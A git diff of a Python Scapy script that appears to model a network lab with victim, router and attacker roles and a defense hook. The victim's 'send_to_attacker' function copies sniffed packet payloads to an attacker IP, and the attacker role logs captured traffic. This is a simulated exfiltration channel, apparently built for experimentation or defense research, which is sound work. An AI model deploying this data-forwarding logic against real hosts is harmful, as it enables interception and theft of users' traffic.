@@ -10,14 +10,6 @@ import my_ips
 
 role = 'victim'
 
-#victim_ip = os.environ['victim_ip']
-#attacker_ip = os.environ['attacker_ip']
-#router_ip = os.environ['router_ip']
-
-#mypkt = IP(dst=router_ip)/TCP()/Raw(load='test1')
-#r1 = sr1(mypkt,iface='eth1',timeout=2)
-#exit()
-
 #Modular packet sniffing function
 def packet_sniffer(my_filter, my_prn):
     print('Calling packet sniffer function.')
@@ -35,9 +27,9 @@ def send_to_router(packet):
 
     load_append = ('|ORIG_DST=' + true_dst).encode("utf-8")
 
-    new_packet = IP(dst=router_ip)/TCP(dport=true_dport)/Raw(load=true_load + load_append)
+    new_packet = IP(dst=my_ips.router_ip)/TCP(dport=true_dport)/Raw(load=true_load + load_append)
 
-    print('Sending packet to router:', new_packet.show())
+    print('Sending packet to router')
     r1 = sr1(new_packet, timeout=5,iface='eth1')
 
 #Victim functions
@@ -49,7 +41,7 @@ def send_to_attacker(packet):
         data = packet[Raw].load
     except:
         data = ''.encode("utf-8")
-    new_packet = IP(dst=attacker_ip)/TCP(dport=80)/Raw(load=data)
+    new_packet = IP(dst=my_ips.attacker_ip)/TCP(dport=80)/Raw(load=data)
 
     send_to_router(new_packet)
 #---
@@ -87,7 +79,7 @@ def reroute_packet(packet):
     forwarded_packet[TCP].sport = packet[TCP].sport
     forwarded_packet[IP].dport = packet[TCP].dport
 
-    print('Forwarded packet:', forwarded_packet.show())
+    print('Forwarded packet')
     r1 = sr1(forwarded_packet, timeout=0,iface='eth1')
 
 def defense_model(packet):
@@ -102,14 +94,11 @@ def get_packet_destination(data):
     # end info = information after the main payload 
     end_info = data.partition(test_field)[2] 
     if(end_info == ''):
-        print(end_info)
-        print(data)
         return -1;
                                                          
     # Split the end substring by | delimiter 
     end_list = end_info.split('|')
     
-    print(end_list[0])
     return end_list[0]
 
 #---
@@ -122,6 +111,7 @@ def log_packet(packet):
     f.write(packet.show())
     f.write('\n')
     f.close()
+    print(packet.show())
 
 #---
 
@@ -133,5 +123,5 @@ if __name__=='__main__':
     elif(role == 'router'):
         packet_sniffer('dst host ' + local_ip + ' and tcp', reroute_packet)
     elif(role == 'attacker'):
-        packet_sniffer('src host ' + victim_ip + ' and tcp', log_packet)
+        packet_sniffer('src host ' + my_ips.router_ip + ' and tcp', log_packet)
     
